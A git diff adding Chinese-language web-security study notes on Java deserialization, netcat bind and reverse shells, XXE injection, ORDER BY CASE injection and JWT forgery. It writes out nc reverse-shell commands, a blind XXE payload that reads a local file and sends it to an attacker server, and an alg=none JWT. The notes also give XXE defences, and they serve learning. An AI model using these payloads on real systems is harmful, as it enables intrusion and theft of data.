@@ -243,6 +243,8 @@ php包含函数会把被包含文件当作php脚本执行，所以会识别被�
 
 
 
+
+
 #PHP反序列化
 原理：未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，
 从而导致代码执行，SQL注入，目录遍历等不可控后果。在反序列化的过程中自动触发
@@ -272,3 +274,192 @@ new ABC时调用构造函数		一个ABC对象被序列化之后会自动调用_s
 
 这些在java中继承下object的方法，在php中称魔法方法，类似的魔法方法还有_tostring()、__get()、_set()等等。
 
+
+
+java反序列化
+
+Java中的API实现：
+位置：Java.io.ObjectOutputStream
+java.io.ObjectlnputStream
+序列化：
+ObjectOutputStream-->writeobject ( )
+注：该方法对参数指定的b对象进行序列化，把字节序列写到一个目标输出流中
+按Java的标准约定是给文件一个。ser扩展名
+反序列化：
+ObjectInputStream>readobject( )
+注：该方法从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回。
+
+java反序列化payload生成工具：ysoserial 
+
+下方的特征可以作为序列化的标志参考：
+一段数据以rO0AB开头，你基本可以确定这串就是JAVA序列化base64加密的数据
+或者如果以aced开头，那么他就是这一段java序列化的16进制。
+
+
+
+如果一台服务器有反序列化远程命令执行漏洞，在服务器执行命令后看不到回显？
+
+构造反弹shell
+
+###### NC 反弹 shell
+
+攻击场景：
+
+```
+　　Victim IP：  192.168.2.10
+　　Attacker IP：192.168.2.11
+```
+
+###### 正向 Shell
+
+我们想要弹回Victim的Shell，使用如下命令：
+
+Victim：nc -lvp 9999 -e cmd.exe
+
+Attacker：nc 192.168.2.10 9999
+
+ps：先在肉鸡上开一个cmd服务，然后在攻击机上进行连接
+
+###### 反向 Shell
+
+Attacker：nc -vlp 9999
+
+Victim：nc 192.168.2.11 9999 -e cmd.exe
+
+ps：先在攻击机上进行监听，然后在肉鸡上给Attacker开一个cmd
+
+Link: https://qftm.github.io/2019/08/03/Windows-Reverse-Shell/
+本文章著作权归作者所有，任何形式的转载都请注明出处。
+
+
+
+XXE-xml外部实体注入漏洞
+
+XML被设计为传输和存储数据，XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。XXE漏洞全称XMLExternal Entity Injection,即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。
+
+html旨在显示信息，而xml旨在传输信息
+
+<?xml version = "1.0"?>
+
+<!DOCTYPE ANY[
+<!ENTITY xxe SYSTEM "file:///c://1.txt">
+]>
+<x>&xxe; i am hacker！</x>
+
+
+回显：flag1231213132 i am hacker！
+
+
+
+XXE注入分有回显和无回显，若无回显，思路是在xml中定义一个变量a接收服务器本地文件，然后访问外部攻击者的服务器把变量a的数据提交上来
+
+无回显一读取文件
+<?xml version="1.0"?>
+
+<!DOCTYPE test
+#定义file变量=d:/test.txt里的内容(base64加密后)
+<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=d:/test.txt">
+#加载外部攻击者服务器写的xml
+<!ENTITY % dtd SYSTEM "http://192.168.0.103:8081/test.dtd">
+#运行dtd
+%dtd;
+#send变量藏在加载的外部xml中
+%send
+]>
+#外部xml
+test.dtd:
+<!ENTITY % payload
+#&#x25;表示%
+"<!ENTITY &#x25; send SYSTEM
+'http://192.168.0.103:8081/?data=%file;'>"
+
+#这个变量的作用在于定义send变量，把file变量的内容发回来
+
+%payload;
+
+怎么找传输xml的接口？
+
+1.数据格式类型判断	例：<user>test</user><pass>Mikasa</pass>
+2.Content-Type值判断：text/xml；application/xml
+3.更改Content-type值，再提交攻击xml（盲猜服务器会接收xml数据，如本来type是application/json，就可以尝试改成application/xml，提交xml的payload)
+
+
+
+#xxe漏洞修复与防御方案-php,java,python-过滤及禁用
+#方案1-禁用外部实体
+PHP:
+libxml_disable_entity_loader(true);
+JAVA:
+DocumentBuilderFactory dbf=DocumentBuilderFactory.newInstance( );dbf.setExpandEntityReferences(false);
+Python:
+from lxml import etree
+xmlData=etree.parse(xmlSource,etree.XMLParser(resolve entities=False)
+
+#方案2-过滤用户提交的xml数据
+过滤关键词：<！DOCTYPE和<！ENTITY,或者SYSTEM和PUBLIC
+
+
+
+JAVA安全-JWT安全及预编译CASE注入等
+
+1.预编译CASE注入
+
+绕过java预编译sql语句，条件是服务器的sql语句中必须用了order by，
+
+如select name, id, age from user order by ?;		也就是根据什么字段排序，涉及到排序功能
+
+通过使用case when语句可以将order byl后的orderExpressioni表达式中添加select语句。
+
+payload：case when(注入语句)
+
+2.JWT安全
+
+JSON Web Token(JSON Web令牌)是一种跨域验证身份的方案。JWT不加密传输的数据，但能够通过数字签名来验证数据未被算改。
+
+jwt内容格式是：头部.声明.数字签名 
+
+签名(Signature)
+服务器有一个不会发送给客户端的密码(secret)），用头部中指定的算野法对头部和声
+明的内容用此密码进行加密，生成的字符串就是JWT的签名。
+下面是一个用HS256生成JWT的代码例子
+HMACSHA256 (base64UrlEncode (header)+"."+
+base64UrlEncode (payload),secret)
+
+**jwt修改伪造攻击**
+
+问题来了，因为J的声明内容变了，因此签名需要重新生成，生成签名又需要密码，我们没有密码呀？不要慌，我们直接去掉签名就好~修改头部为None
+在HTTP传输过程中，Base64编码中的"=”，"+”，"/"等待殊符号通过UL解码通常容
+易产生歧义，因此产生了与URL兼容的Base64 URL编码
+
+[jwt解密/加密 - bejson在线工具](https://www.bejson.com/jwt/)
+
+如Payload:
+
+ewogICJhbGcioiAibm9uZSIKfQ.ewogICJpYXQioiAxNTgOMTY2NTIOLAogIc
+JhZG1pbiI6ICJOenvlIiwKICAidXNleiI6ICJUb20iCn0.	
+
+把base64 URL解密后的头部alg值改成none, 数字签名直接不写;这种方法成功与否取决与对方服务器有没有做签名验证
+
+**jwt密钥爆破**
+通过具有SHA-2功能的HMAC,您可以使用密钥来签名和验证令牌。一旦找出了这个密钥，我们就可以创建一个新令牌并对其进行签名。因此，密钥足够强大非常重要，这样暴力破解或字典攻击就不可行。拥有令牌后，就可以发起离线暴力破解或字典攻击。
+
+拿jwt数据，得到加密的算法，然后密钥用字典去跑加密算法，直到解密后的数据==原jwt数据为止，跑之前记得先base64 URL解密
+
+注意！jwt的声明部分一般都有iat和exp两个变量，值是时间戳，分别代表令牌生效时间和失效时间。如果拿到密钥，修改内容时不要忘了这一点。
+
+
+
+1、用户端登录，用户名和密码在请求中被发往服务器
+2、（确认登录信息正确后）服务器生成JSON头部和声明，将登录信息写入JSON的声明中(通常不应写入密码，因为JWT是不加密的)，并用secret用指定算法进行加密，生成该用户的JWT。此时，服务器并没有保存登录状态信息。
+3、服务器将JWT（通过响应）返回给客户端
+4、用户下次会话时，客户端会自动将JWT写在HTTP请求头部的Authorization字段中
+5、服务器对JWT进行验证，若验证成功，则确认此用户的登录状态
+6、服务器返回响应
+
+jwt类型漏洞的检测：
+
+1.javaweb
+
+2.Authorization字段
+
+3.JWT数据包格式
